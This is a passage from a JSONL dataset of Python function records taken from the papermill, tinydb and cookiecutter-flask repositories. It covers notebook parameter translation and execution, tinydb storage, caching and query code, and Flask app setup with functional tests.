00:00:00", "repo_name": "nteract/papermill", "stars": 5560, "license": "bsd-3-clause", "language": "python", "size": 2145}
{"docstring": "# Leading '_' aren't legal R variable names -- so we drop them when injecting\n", "func_signal": "def assign(cls, name, str_val):\n", "code": "while name.startswith(\"_\"):\n    name = name[1:]\nreturn '{} = {}'.format(name, str_val)", "path": "papermill/papermill/translators.py", "commit_date": "2020-09-06 00:00:00", "repo_name": "nteract/papermill", "stars": 5560, "license": "bsd-3-clause", "language": "python", "size": 2145}
{"docstring": "\"\"\"Reusable by most interpreters\"\"\"\n", "func_signal": "def translate_escaped_str(cls, str_val):\n", "code": "if isinstance(str_val, str):\n    str_val = str_val.encode('unicode_escape')\n    if sys.version_info >= (3, 0):\n        str_val = str_val.decode('utf-8')\n    str_val = str_val.replace('\"', r'\\\"')\nreturn '\"{}\"'.format(str_val)", "path": "papermill/papermill/translators.py", "commit_date": "2020-09-06 00:00:00", "repo_name": "nteract/papermill", "stars": 5560, "license": "bsd-3-clause", "language": "python", "size": 2145}
{"docstring": "\"\"\"Translate a string to an escaped Matlab string\"\"\"\n", "func_signal": "def translate_escaped_str(cls, str_val):\n", "code": "if isinstance(str_val, str):\n    str_val = str_val.encode('unicode_escape')\n    if sys.version_info >= (3, 0):\n        str_val = str_val.decode('utf-8')\n    str_val = str_val.replace('\"', '\"\"')\nreturn '\"{}\"'.format(str_val)", "path": "papermill/papermill/translators.py", "commit_date": "2020-09-06 00:00:00", "repo_name": "nteract/papermill", "stars": 5560, "license": "bsd-3-clause", "language": "python", "size": 2145}
{"docstring": "\"\"\"Translate each of the standard json/yaml types to appropiate objects.\"\"\"\n", "func_signal": "def translate(cls, val):\n", "code": "if val is None:\n    return cls.translate_none(val)\nelif isinstance(val, str):\n    return cls.translate_str(val)\n# Needs to be before integer checks\nelif isinstance(val, bool):\n    return cls.translate_bool(val)\nelif isinstance(val, int):\n    return cls.translate_int(val)\nelif isinstance(val, float):\n    return cls.translate_float(val)\nelif isinstance(val, dict):\n    return cls.translate_dict(val)\nelif isinstance(val, list):\n    return cls.translate_list(val)\n# Use this generic translation as a last resort\nreturn cls.translate_escaped_str(val)", "path": "papermill/papermill/translators.py", "commit_date": "2020-09-06 00:00:00", "repo_name": "nteract/papermill", "stars": 5560, "license": "bsd-3-clause", "language": "python", "size": 2145}
{"docstring": "\"\"\"\nProcess a given output. May log it in the configured logger and/or write it into\nthe configured stdout/stderr files.\n\n:param output: nbformat.notebooknode.NotebookNode\n:return:\n\"\"\"\n", "func_signal": "def log_output_message(self, output):\n", "code": "if output.output_type == \"stream\":\n    content = \"\".join(output.text)\n    if output.name == \"stdout\":\n        if self.log_output:\n            self.log.info(content)\n        if self.stdout_file:\n            self.stdout_file.write(content)\n            self.stdout_file.flush()\n    elif output.name == \"stderr\":\n        if self.log_output:\n            # In case users want to redirect stderr differently, pipe to warning\n            self.log.warning(content)\n        if self.stderr_file:\n            self.stderr_file.write(content)\n            self.stderr_file.flush()\nelif self.log_output and (\"data\" in output and \"text/plain\" in output.data):\n    self.log.info(\"\".join(output.data['text/plain']))", "path": "papermill/papermill/clientwrap.py", "commit_date": "2020-06-29 00:00:00", "repo_name": "nteract/papermill", "stars": 5560, "license": "bsd-3-clause", "language": "python", "size": 2145}
{"docstring": "\"\"\"Remove arguments from kwargs.\n\nParameters\n----------\nargs : list\n    Argument names to remove from kwargs\n**kwargs\n    Arbitrary keyword arguments\n\nReturns\n-------\nkwargs : dict\n   New dictionary of arguments\n\"\"\"\n", "func_signal": "def remove_args(args=None, **kwargs):\n", "code": "if not args:\n    return kwargs\nreturn {k: v for k, v in kwargs.items() if k not in args}", "path": "papermill/papermill/utils.py", "commit_date": "2020-09-06 00:00:00", "repo_name": "nteract/papermill", "stars": 5560, "license": "bsd-3-clause", "language": "python", "size": 2145}
{"docstring": "\"\"\"Assigned parameters into the appropriate place in the input notebook\n\nParameters\n----------\nnb : NotebookNode\n   Executable notebook object\nparameters : dict\n   Arbitrary keyword arguments to pass as notebook parameters\nreport_mode : bool, optional\n   Flag to set report mode\ncomment : str, optional\n    Comment added to the injected cell\n\"\"\"\n# Load from a file if 'parameters' is a string.\n", "func_signal": "def parameterize_notebook(nb, parameters, report_mode=False, comment='Parameters'):\n", "code": "if isinstance(parameters, str):\n    parameters = read_yaml_file(parameters)\n\n# Copy the nb object to avoid polluting the input\nnb = copy.deepcopy(nb)\n\nkernel_name = nb.metadata.kernelspec.name\nlanguage = nb.metadata.kernelspec.language\n\n# Generate parameter content based on the kernel_name\nparam_content = translate_parameters(kernel_name, language, parameters, comment)\n\nnewcell = nbformat.v4.new_code_cell(source=param_content)\nnewcell.metadata['tags'] = ['injected-parameters']\n\nif report_mode:\n    newcell.metadata['jupyter'] = newcell.get('jupyter', {})\n    newcell.metadata['jupyter']['source_hidden'] = True\n\nparam_cell_index = find_first_tagged_cell_index(nb, 'parameters')\ninjected_cell_index = find_first_tagged_cell_index(nb, 'injected-parameters')\nif injected_cell_index >= 0:\n    # Replace the injected cell with a new version\n    before = nb.cells[:injected_cell_index]\n    after = nb.cells[injected_cell_index + 1 :]\nelif param_cell_index >= 0:\n    # Add an injected cell after the parameter cell\n    before = nb.cells[: param_cell_index + 1]\n    after = nb.cells[param_cell_index + 1 :]\nelse:\n    # Inject to the top of the notebook\n    logger.warning(\"Input notebook does not contain a cell with tag 'parameters'\")\n    before = []\n    after = nb.cells\n\nnb.cells = before + [newcell] + after\nnb.metadata.papermill['parameters'] = parameters\n\nreturn nb", "path": "papermill/papermill/parameterize.py", "commit_date": "2020-09-06 00:00:00", "repo_name": "nteract/papermill", "stars": 5560, "license": "bsd-3-clause", "language": "python", "size": 2145}
{"docstring": "\"\"\"\nWraps the parent class process call slightly\n\"\"\"\n", "func_signal": "def execute(self, **kwargs):\n", "code": "self.reset_execution_trackers()\n\n# See https://bugs.python.org/issue37373 :(\nif sys.version_info[0] == 3 and sys.version_info[1] >= 8 and sys.platform.startswith('win'):\n    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())\n\nwith self.setup_kernel(**kwargs):\n    self.log.info(\"Executing notebook with kernel: %s\" % self.kernel_name)\n    self.papermill_execute_cells()\n    info_msg = self.wait_for_reply(self.kc.kernel_info())\n    self.nb.metadata['language_info'] = info_msg['content']['language_info']\n    self.set_widgets_metadata()\n\nreturn self.nb", "path": "papermill/papermill/clientwrap.py", "commit_date": "2020-06-29 00:00:00", "repo_name": "nteract/papermill", "stars": 5560, "license": "bsd-3-clause", "language": "python", "size": 2145}
{"docstring": "\"\"\"Translate dicts to scala Maps\"\"\"\n", "func_signal": "def translate_dict(cls, val):\n", "code": "escaped = ', '.join(\n    [\"{} -> {}\".format(cls.translate_str(k), cls.translate(v)) for k, v in val.items()]\n)\nreturn 'Map({})'.format(escaped)", "path": "papermill/papermill/translators.py", "commit_date": "2020-09-06 00:00:00", "repo_name": "nteract/papermill", "stars": 5560, "license": "bsd-3-clause", "language": "python", "size": 2145}
{"docstring": "\"\"\"Translate list to scala Seq\"\"\"\n", "func_signal": "def translate_list(cls, val):\n", "code": "escaped = ', '.join([cls.translate(v) for v in val])\nreturn 'Seq({})'.format(escaped)", "path": "papermill/papermill/translators.py", "commit_date": "2020-09-06 00:00:00", "repo_name": "nteract/papermill", "stars": 5560, "license": "bsd-3-clause", "language": "python", "size": 2145}
{"docstring": "\"\"\"Change working directory to `path` and restore old path on exit.\n\n`path` can be `None` in which case this is a no-op.\n\"\"\"\n", "func_signal": "def chdir(path):\n", "code": "if path is None:\n    yield\n\nelse:\n    old_dir = os.getcwd()\n    os.chdir(path)\n    try:\n        yield\n    finally:\n        os.chdir(old_dir)", "path": "papermill/papermill/utils.py", "commit_date": "2020-09-06 00:00:00", "repo_name": "nteract/papermill", "stars": 5560, "license": "bsd-3-clause", "language": "python", "size": 2145}
{"docstring": "\"\"\"Find the first tagged cell ``tag`` in the notebook.\n\nParameters\n----------\nnb : nbformat.NotebookNode\n    The notebook to introspect\ntag : str\n    The tag to look for\n\nReturns\n-------\nnbformat.NotebookNode\n    Whether the notebook contains a cell tagged ``tag``?\n\"\"\"\n", "func_signal": "def find_first_tagged_cell_index(nb, tag):\n", "code": "parameters_indices = []\nfor idx, cell in enumerate(nb.cells):\n    if tag in cell.metadata.tags:\n        parameters_indices.append(idx)\nif not parameters_indices:\n    return -1\nreturn parameters_indices[0]", "path": "papermill/papermill/utils.py", "commit_date": "2020-09-06 00:00:00", "repo_name": "nteract/papermill", "stars": 5560, "license": "bsd-3-clause", "language": "python", "size": 2145}
{"docstring": "\"\"\"Inspect the parameters cell to get a Parameter list\n\nIt must return an empty list if no parameters are found and\nit should ignore inspection errors.\n\nParameters\n----------\nparameters_cell : NotebookNode\n    Cell tagged _parameters_\n\nReturns\n-------\nList[Parameter]\n    A list of all parameters\n\"\"\"\n", "func_signal": "def inspect(cls, parameters_cell):\n", "code": "params = []\nsrc = parameters_cell['source']\n\ndef flatten_accumulator(accumulator):\n    \"\"\"Flatten a multilines variable definition.\n\n    Remove all comments except on the latest line - will be interpreted as help.\n\n    Args:\n        accumulator (List[str]): Line composing the variable definition\n    Returns:\n        Flatten definition\n    \"\"\"\n    flat_string = \"\"\n    for line in accumulator[:-1]:\n        if \"#\" in line:\n            comment_pos = line.index(\"#\")\n            flat_string += line[:comment_pos].strip()\n        else:\n            flat_string += line.strip()\n    if len(accumulator):\n        flat_string += accumulator[-1].strip()\n    return flat_string\n\n# Some common type like dictionaries or list can be expressed over multiline.\n# To support the parsing of such case, the cell lines are grouped between line\n# actually containing an assignment. In each group, the commented and empty lines\n# are skip; i.e. the parameter help can only be given as comment on the last variable\n# line definition\ngrouped_variable = []\naccumulator = []\nfor iline, line in enumerate(src.splitlines()):\n    if len(line.strip()) == 0 or line.strip().startswith('#'):\n        continue  # Skip blank and comment\n\n    nequal = line.count(\"=\")\n    if nequal > 0:\n        grouped_variable.append(flatten_accumulator(accumulator))\n        accumulator = []\n        if nequal > 1:\n            logger.warning(\"Unable to parse line {} '{}'.\".format(iline + 1, line))\n            continue\n\n    accumulator.append(line)\ngrouped_variable.append(flatten_accumulator(accumulator))\n\nfor definition in grouped_variable:\n    if len(definition) == 0:\n        continue\n\n    match = re.match(cls.PARAMETER_PATTERN, definition)\n    if match is not None:\n        attr = match.groupdict()\n        if attr[\"target\"] is None:  # Fail to get variable name\n            continue\n\n        type_name = str(attr[\"annotation\"] or attr[\"type_comment\"] or None)\n        params.append(\n            Parameter(\n                name=attr[\"target\"].strip(),\n                inferred_type_name=type_name.strip(),\n                default=str(attr[\"value\"]).strip(),\n                help=str(attr[\"help\"] or \"\").strip(),\n            )\n        )\n\nreturn params", "path": "papermill/papermill/translators.py", "commit_date": "2020-09-06 00:00:00", "repo_name": "nteract/papermill", "stars": 5560, "license": "bsd-3-clause", "language": "python", "size": 2145}
{"docstring": "\"\"\"Translate a string to an escaped Matlab string\"\"\"\n", "func_signal": "def translate_escaped_str(cls, str_val):\n", "code": "if isinstance(str_val, str):\n    str_val = str_val.encode('unicode_escape')\n    if sys.version_info >= (3, 0):\n        str_val = str_val.decode('utf-8')\n    str_val = str_val.replace('\"', '`\"')\nreturn '\"{}\"'.format(str_val)", "path": "papermill/papermill/translators.py", "commit_date": "2020-09-06 00:00:00", "repo_name": "nteract/papermill", "stars": 5560, "license": "bsd-3-clause", "language": "python", "size": 2145}
{"docstring": "\"\"\"Initializes the execution manager.\n\nParameters\n----------\nnb_man : NotebookExecutionManager\n    Notebook execution manager wrapper being executed.\nkm : KernerlManager (optional)\n    Optional kernel manager. If none is provided, a kernel manager will\n    be created.\n\"\"\"\n", "func_signal": "def __init__(self, nb_man, km=None, raise_on_iopub_timeout=True, **kw):\n", "code": "super().__init__(nb_man.nb, km=km, raise_on_iopub_timeout=raise_on_iopub_timeout, **kw)\nself.nb_man = nb_man", "path": "papermill/papermill/clientwrap.py", "commit_date": "2020-06-29 00:00:00", "repo_name": "nteract/papermill", "stars": 5560, "license": "bsd-3-clause", "language": "python", "size": 2145}
{"docstring": "\"\"\"Merge named argument.\n\nFunction takes a dictionary of caller arguments and callee arguments as keyword arguments\nReturns a dictionary with merged arguments. If same argument is in both caller and callee\narguments the last one will be taken and warning will be raised.\n\nParameters\n----------\ncaller_args : dict\n    Caller arguments\n**callee_args\n    Keyword callee arguments\n\nReturns\n-------\nargs : dict\n   Merged arguments\n\"\"\"\n", "func_signal": "def merge_kwargs(caller_args, **callee_args):\n", "code": "conflicts = set(caller_args) & set(callee_args)\nif conflicts:\n    args = format('; '.join(['{}={}'.format(key, value) for key, value in callee_args.items()]))\n    msg = \"Callee will overwrite caller's argument(s): {}\".format(args)\n    warnings.warn(msg, PapermillParameterOverwriteWarning)\nreturn dict(caller_args, **callee_args)", "path": "papermill/papermill/utils.py", "commit_date": "2020-09-06 00:00:00", "repo_name": "nteract/papermill", "stars": 5560, "license": "bsd-3-clause", "language": "python", "size": 2145}
{"docstring": "\"\"\"Translate dicts to nontyped dictionary\"\"\"\n\n", "func_signal": "def translate_dict(cls, val):\n", "code": "kvps = ', '.join(\n    [\"{{ {} , {} }}\".format(cls.translate_str(k), cls.translate(v)) for k, v in val.items()]\n)\nreturn 'new Dictionary<string,Object>{{ {} }}'.format(kvps)", "path": "papermill/papermill/translators.py", "commit_date": "2020-09-06 00:00:00", "repo_name": "nteract/papermill", "stars": 5560, "license": "bsd-3-clause", "language": "python", "size": 2145}
{"docstring": "\"\"\"Return the inferred notebook parameters.\n\nParameters\n----------\nnotebook_path : str or Path\n    Path to notebook\nparameters : dict, optional\n    Arbitrary keyword arguments to pass to the notebook parameters\n\nReturns\n-------\nDict[str, Parameter]\n   Mapping of (parameter name, {name, inferred_type_name, default, help})\n\"\"\"\n", "func_signal": "def inspect_notebook(notebook_path, parameters=None):\n", "code": "if isinstance(notebook_path, Path):\n    notebook_path = str(notebook_path)\n\nnb = _open_notebook(notebook_path, parameters)\n\nparams = _infer_parameters(nb)\nreturn {p.name: p._asdict() for p in params}", "path": "papermill/papermill/inspection.py", "commit_date": "2020-10-30 00:00:00", "repo_name": "nteract/papermill", "stars": 5560, "license": "bsd-3-clause", "language": "python", "size": 2145}
{"docstring": "\"\"\"\nReturn the ID for a newly inserted document.\n\"\"\"\n\n# If we already know the next ID\n", "func_signal": "def _get_next_id(self):\n", "code": "if self._next_id is not None:\n    next_id = self._next_id\n    self._next_id = next_id + 1\n\n    return next_id\n\n# Determine the next document ID by finding out the max ID value\n# of the current table documents\n\n# Read the table documents\ntable = self._read_table()\n\n# If the table is empty, set the initial ID\nif not table:\n    next_id = 1\n    self._next_id = next_id + 1\n\n    return next_id\n\n# Determine the next ID based on the maximum ID that's currently in use\nmax_id = max(self.document_id_class(i) for i in table.keys())\nnext_id = max_id + 1\n\n# The next ID we wil return AFTER this call needs to be larger than\n# the current next ID we calculated\nself._next_id = next_id + 1\n\nreturn next_id", "path": "tinydb/tinydb/table.py", "commit_date": "2020-11-14 00:00:00", "repo_name": "msiemens/tinydb", "stars": 6416, "license": "mit", "language": "python", "size": 1025}
{"docstring": "\"\"\"\nTest for a dict where a provided key exists.\n\n>>> Query().f1.exists()\n\"\"\"\n", "func_signal": "def exists(self) -> QueryInstance:\n", "code": "return self._generate_test(\n    lambda _: True,\n    ('exists', self._path)\n)", "path": "tinydb/tinydb/queries.py", "commit_date": "2020-12-30 00:00:00", "repo_name": "msiemens/tinydb", "stars": 6416, "license": "mit", "language": "python", "size": 1025}
{"docstring": "# Write contents\n", "func_signal": "def test_caching_flush_manually(storage):\n", "code": "storage.write(doc)\n\nstorage.flush()\n\n# Verify contents: Cache should be emptied and written to storage\nassert storage.memory", "path": "tinydb/tests/test_middlewares.py", "commit_date": "2019-11-02 00:00:00", "repo_name": "msiemens/tinydb", "stars": 6416, "license": "mit", "language": "python", "size": 1025}
{"docstring": "# Write contents\n", "func_signal": "def test_caching(storage):\n", "code": "storage.write(doc)\n\n# Verify contents\nassert doc == storage.read()", "path": "tinydb/tests/test_middlewares.py", "commit_date": "2019-11-02 00:00:00", "repo_name": "msiemens/tinydb", "stars": 6416, "license": "mit", "language": "python", "size": 1025}
{"docstring": "# Initialize the parent constructor\n", "func_signal": "def __init__(self, storage_cls):\n", "code": "super().__init__(storage_cls)\n\n# Prepare the cache\nself.cache = None\nself._cache_modified_count = 0", "path": "tinydb/tinydb/middlewares.py", "commit_date": "2020-02-19 00:00:00", "repo_name": "msiemens/tinydb", "stars": 6416, "license": "mit", "language": "python", "size": 1025}
{"docstring": "# Flush potentially unwritten data\n", "func_signal": "def close(self):\n", "code": "self.flush()\n\n# Let the storage clean up too\nself.storage.close()", "path": "tinydb/tinydb/middlewares.py", "commit_date": "2020-02-19 00:00:00", "repo_name": "msiemens/tinydb", "stars": 6416, "license": "mit", "language": "python", "size": 1025}
{"docstring": "\"\"\"\nFlush all unwritten data to disk.\n\"\"\"\n", "func_signal": "def flush(self):\n", "code": "if self._cache_modified_count > 0:\n    # Force-flush the cache by writing the data to the storage\n    self.storage.write(self.cache)\n    self._cache_modified_count = 0", "path": "tinydb/tinydb/middlewares.py", "commit_date": "2020-02-19 00:00:00", "repo_name": "msiemens/tinydb", "stars": 6416, "license": "mit", "language": "python", "size": 1025}
{"docstring": "\"\"\"\nTruncate the table by removing all documents.\n\"\"\"\n\n# Update the table by resetting all data\n", "func_signal": "def truncate(self) -> None:\n", "code": "self._update_table(lambda table: table.clear())\n\n# Reset document ID counter\nself._next_id = None", "path": "tinydb/tinydb/table.py", "commit_date": "2020-11-14 00:00:00", "repo_name": "msiemens/tinydb", "stars": 6416, "license": "mit", "language": "python", "size": 1025}
{"docstring": "\"\"\"\nCreate a new instance.\n\"\"\"\n\n", "func_signal": "def __init__(self):\n", "code": "super().__init__()\nself.memory = None", "path": "tinydb/tinydb/storages.py", "commit_date": "2020-05-07 00:00:00", "repo_name": "msiemens/tinydb", "stars": 6416, "license": "mit", "language": "python", "size": 1025}
{"docstring": "\"\"\"\nIterate over all documents stored in the table.\n\n:returns: an iterator over all documents.\n\"\"\"\n\n# Iterate all documents and their IDs\n", "func_signal": "def __iter__(self) -> Iterator[Document]:\n", "code": "for doc_id, doc in self._read_table().items():\n    # Convert documents to the document class\n    yield self.document_class(doc, doc_id)", "path": "tinydb/tinydb/table.py", "commit_date": "2020-11-14 00:00:00", "repo_name": "msiemens/tinydb", "stars": 6416, "license": "mit", "language": "python", "size": 1025}
{"docstring": "# Test integration into TinyDB\n", "func_signal": "def test_lru_cache(db):\n", "code": "table = db.table('table3', cache_size=2)\nquery = where('int') == 1\n\ntable.search(query)\ntable.search(where('int') == 2)\ntable.search(where('int') == 3)\nassert query not in table._query_cache\n\ntable.remove(where('int') == 1)\nassert not table._query_cache.lru\n\ntable.search(query)\n\nassert len(table._query_cache) == 1\ntable.clear_cache()\nassert len(table._query_cache) == 0", "path": "tinydb/tests/test_tables.py", "commit_date": "2020-02-19 00:00:00", "repo_name": "msiemens/tinydb", "stars": 6416, "license": "mit", "language": "python", "size": 1025}
{"docstring": "\"\"\"\nCount the total number of documents in this table.\n\"\"\"\n\n# Using self._read_table() will convert all documents into\n# the document class. But for counting the number of documents\n# this conversion is not necessary, thus we read the storage\n# directly here\n\n", "func_signal": "def __len__(self):\n", "code": "tables = self._storage.read()\n\nif tables is None:\n    return 0\n\ntry:\n    return len(tables[self.name])\nexcept KeyError:\n    return 0", "path": "tinydb/tinydb/table.py", "commit_date": "2020-11-14 00:00:00", "repo_name": "msiemens/tinydb", "stars": 6416, "license": "mit", "language": "python", "size": 1025}
{"docstring": "# Write contents\n", "func_signal": "def test_caching_flush(storage):\n", "code": "for _ in range(CachingMiddleware.WRITE_CACHE_SIZE - 1):\n    storage.write(doc)\n\n# Not yet flushed...\nassert storage.memory is None\n\nstorage.write(doc)\n\n# Verify contents: Cache should be emptied and written to storage\nassert storage.memory", "path": "tinydb/tests/test_middlewares.py", "commit_date": "2019-11-02 00:00:00", "repo_name": "msiemens/tinydb", "stars": 6416, "license": "mit", "language": "python", "size": 1025}
{"docstring": "\"\"\"\nCreate the storage instance and store it as self.storage.\n\nUsually a user creates a new TinyDB instance like this::\n\n    TinyDB(storage=StorageClass)\n\nThe storage keyword argument is used by TinyDB this way::\n\n    self.storage = storage(*args, **kwargs)\n\nAs we can see, ``storage(...)`` runs the constructor and returns the\nnew storage instance.\n\n\nUsing Middlewares, the user will call::\n\n                               The 'real' storage class\n                               v\n    TinyDB(storage=Middleware(StorageClass))\n               ^\n               Already an instance!\n\nSo, when running ``self.storage = storage(*args, **kwargs)`` Python\nnow will call ``__call__`` and TinyDB will expect the return value to\nbe the storage (or Middleware) instance. Returning the instance is\nsimple, but we also got the underlying (*real*) StorageClass as an\n__init__ argument that still is not an instance.\nSo, we initialize it in __call__ forwarding any arguments we recieve\nfrom TinyDB (``TinyDB(arg1, kwarg1=value, storage=...)``).\n\nIn case of nested Middlewares, calling the instance as if it was an\nclass results in calling ``__call__`` what initializes the next\nnested Middleware that itself will initialize the next Middleware and\nso on.\n\"\"\"\n\n", "func_signal": "def __call__(self, *args, **kwargs):\n", "code": "self.storage = self._storage_cls(*args, **kwargs)\n\nreturn self", "path": "tinydb/tinydb/middlewares.py", "commit_date": "2020-02-19 00:00:00", "repo_name": "msiemens/tinydb", "stars": 6416, "license": "mit", "language": "python", "size": 1025}
{"docstring": "# Store data in cache\n", "func_signal": "def write(self, data):\n", "code": "self.cache = data\nself._cache_modified_count += 1\n\n# Check if we need to flush the cache\nif self._cache_modified_count >= self.WRITE_CACHE_SIZE:\n    self.flush()", "path": "tinydb/tinydb/middlewares.py", "commit_date": "2020-02-19 00:00:00", "repo_name": "msiemens/tinydb", "stars": 6416, "license": "mit", "language": "python", "size": 1025}
{"docstring": "# Write contents\n", "func_signal": "def test_caching_write(storage):\n", "code": "storage.write(doc)\n\nstorage.close()\n\n# Verify contents: Cache should be emptied and written to storage\nassert storage.storage.memory", "path": "tinydb/tests/test_middlewares.py", "commit_date": "2019-11-02 00:00:00", "repo_name": "msiemens/tinydb", "stars": 6416, "license": "mit", "language": "python", "size": 1025}
{"docstring": "# Get the file size by moving the cursor to the file end and reading\n# its location\n", "func_signal": "def read(self) -> Optional[Dict[str, Dict[str, Any]]]:\n", "code": "self._handle.seek(0, os.SEEK_END)\nsize = self._handle.tell()\n\nif not size:\n    # File is empty so we return ``None`` so TinyDB can properly\n    # initialize the database\n    return None\nelse:\n    # Return the cursor to the beginning of the file\n    self._handle.seek(0)\n\n    # Load the JSON contents of the file\n    return json.load(self._handle)", "path": "tinydb/tinydb/storages.py", "commit_date": "2020-05-07 00:00:00", "repo_name": "msiemens/tinydb", "stars": 6416, "license": "mit", "language": "python", "size": 1025}
{"docstring": "\"\"\"\nRead the table data from the underlying storage.\n\nHere we read the data from the underlying storage and convert all\nIDs to the document ID class. Documents themselves are NOT yet\ntransformed into the document class, we may not want to convert\n*all* documents when returning only one document for example.\n\"\"\"\n\n# Retrieve the tables from the storage\n", "func_signal": "def _read_table(self) -> Dict[int, Mapping]:\n", "code": "tables = self._storage.read()\n\nif tables is None:\n    # The database is empty\n    return {}\n\n# Retrieve the current table's data\ntry:\n    table = tables[self.name]\nexcept KeyError:\n    # The table does not exist yet, so it is empty\n    return {}\n\n# Convert all document IDs to the correct document ID class and return\n# the table data dict\nreturn {\n    self.document_id_class(doc_id): doc\n    for doc_id, doc in table.items()\n}", "path": "tinydb/tinydb/table.py", "commit_date": "2020-11-14 00:00:00", "repo_name": "msiemens/tinydb", "stars": 6416, "license": "mit", "language": "python", "size": 1025}
{"docstring": "\"\"\"\nAlways evaluate to ``True``.\n\nUseful for having a base value when composing queries dynamically.\n\"\"\"\n\n", "func_signal": "def noop(self) -> QueryInstance:\n", "code": "return QueryInstance(\n    lambda value: True,\n    ()\n)", "path": "tinydb/tinydb/queries.py", "commit_date": "2020-12-30 00:00:00", "repo_name": "msiemens/tinydb", "stars": 6416, "license": "mit", "language": "python", "size": 1025}
{"docstring": "# The current path of fields to access when evaluating the object\n", "func_signal": "def __init__(self) -> None:\n", "code": "self._path = ()  # type: Tuple[str, ...]\n\n# Prevent empty queries to be evaluated\ndef notest(_):\n    raise RuntimeError('Empty query was evaluated')\n\nsuper().__init__(\n    test=notest,\n    hashval=(None,)\n)", "path": "tinydb/tinydb/queries.py", "commit_date": "2020-12-30 00:00:00", "repo_name": "msiemens/tinydb", "stars": 6416, "license": "mit", "language": "python", "size": 1025}
{"docstring": "\"\"\"Register Flask extensions.\"\"\"\n", "func_signal": "def register_extensions(app):\n", "code": "bcrypt.init_app(app)\ncache.init_app(app)\ndb.init_app(app)\ncsrf_protect.init_app(app)\nlogin_manager.init_app(app)\ndebug_toolbar.init_app(app)\nmigrate.init_app(app, db)\nflask_static_digest.init_app(app)\nreturn None", "path": "cookiecutter-flask/{{cookiecutter.app_name}}/{{cookiecutter.app_name}}/app.py", "commit_date": "2019-11-12 00:00:00", "repo_name": "cookiecutter-flask/cookiecutter-flask", "stars": 4498, "license": "mit", "language": "python", "size": 3240}
{"docstring": "\"\"\"Run the tests.\"\"\"\n", "func_signal": "def test():\n", "code": "import pytest\n\nrv = pytest.main([TEST_PATH, \"--verbose\"])\nexit(rv)", "path": "cookiecutter-flask/{{cookiecutter.app_name}}/{{cookiecutter.app_name}}/commands.py", "commit_date": "2020-07-04 00:00:00", "repo_name": "cookiecutter-flask/cookiecutter-flask", "stars": 4498, "license": "mit", "language": "python", "size": 3240}
{"docstring": "\"\"\"Login successful.\"\"\"\n# Goes to homepage\n", "func_signal": "def test_can_log_in_returns_200(self, user, testapp):\n", "code": "res = testapp.get(\"/\")\n# Fills out login form in navbar\nform = res.forms[\"loginForm\"]\nform[\"username\"] = user.username\nform[\"password\"] = \"myprecious\"\n# Submits\nres = form.submit().follow()\nassert res.status_code == 200", "path": "cookiecutter-flask/{{cookiecutter.app_name}}/tests/test_functional.py", "commit_date": "2019-06-10 00:00:00", "repo_name": "cookiecutter-flask/cookiecutter-flask", "stars": 4498, "license": "mit", "language": "python", "size": 3240}
{"docstring": "\"\"\"Register Flask blueprints.\"\"\"\n", "func_signal": "def register_blueprints(app):\n", "code": "app.register_blueprint(public.views.blueprint)\napp.register_blueprint(user.views.blueprint)\nreturn None", "path": "cookiecutter-flask/{{cookiecutter.app_name}}/{{cookiecutter.app_name}}/app.py", "commit_date": "2019-11-12 00:00:00", "repo_name": "cookiecutter-flask/cookiecutter-flask", "stars": 4498, "license": "mit", "language": "python", "size": 3240}
{"docstring": "\"\"\"Home page.\"\"\"\n", "func_signal": "def home():\n", "code": "form = LoginForm(request.form)\ncurrent_app.logger.info(\"Hello from the home page!\")\n# Handle logging in\nif request.method == \"POST\":\n    if form.validate_on_submit():\n        login_user(form.user)\n        flash(\"You are logged in.\", \"success\")\n        redirect_url = request.args.get(\"next\") or url_for(\"user.members\")\n        return redirect(redirect_url)\n    else:\n        flash_errors(form)\nreturn render_template(\"public/home.html\", form=form)", "path": "cookiecutter-flask/{{cookiecutter.app_name}}/{{cookiecutter.app_name}}/public/views.py", "commit_date": "2019-06-10 00:00:00", "repo_name": "cookiecutter-flask/cookiecutter-flask", "stars": 4498, "license": "mit", "language": "python", "size": 3240}
{"docstring": "\"\"\"Show alert on logout.\"\"\"\n", "func_signal": "def test_sees_alert_on_log_out(self, user, testapp):\n", "code": "res = testapp.get(\"/\")\n# Fills out login form in navbar\nform = res.forms[\"loginForm\"]\nform[\"username\"] = user.username\nform[\"password\"] = \"myprecious\"\n# Submits\nres = form.submit().follow()\nres = testapp.get(url_for(\"public.logout\")).follow()\n# sees alert\nassert \"You are logged out.\" in res", "path": "cookiecutter-flask/{{cookiecutter.app_name}}/tests/test_functional.py", "commit_date": "2019-06-10 00:00:00", "repo_name": "cookiecutter-flask/cookiecutter-flask", "stars": 4498, "license": "mit", "language": "python", "size": 3240}
{"docstring": "\"\"\"Register error handlers.\"\"\"\n\n", "func_signal": "def register_errorhandlers(app):\n", "code": "def render_error(error):\n    \"\"\"Render error template.\"\"\"\n    # If a HTTPException, pull the `code` attribute; default to 500\n    error_code = getattr(error, \"code\", 500)\n    return render_template(f\"{error_code}.html\"), error_code\n\nfor errcode in [401, 404, 500]:\n    app.errorhandler(errcode)(render_error)\nreturn None", "path": "cookiecutter-flask/{{cookiecutter.app_name}}/{{cookiecutter.app_name}}/app.py", "commit_date": "2019-11-12 00:00:00", "repo_name": "cookiecutter-flask/cookiecutter-flask", "stars": 4498, "license": "mit", "language": "python", "size": 3240}
{"docstring": "\"\"\"Show error if passwords don't match.\"\"\"\n# Goes to registration page\n", "func_signal": "def test_sees_error_message_if_passwords_dont_match(self, user, testapp):\n", "code": "res = testapp.get(url_for(\"public.register\"))\n# Fills out form, but passwords don't match\nform = res.forms[\"registerForm\"]\nform[\"username\"] = \"foobar\"\nform[\"email\"] = \"foo@bar.com\"\nform[\"password\"] = \"secret\"\nform[\"confirm\"] = \"secrets\"\n# Submits\nres = form.submit()\n# sees error message\nassert \"Passwords must match\" in res", "path": "cookiecutter-flask/{{cookiecutter.app_name}}/tests/test_functional.py", "commit_date": "2019-06-10 00:00:00", "repo_name": "cookiecutter-flask/cookiecutter-flask", "stars": 4498, "license": "mit", "language": "python", "size": 3240}
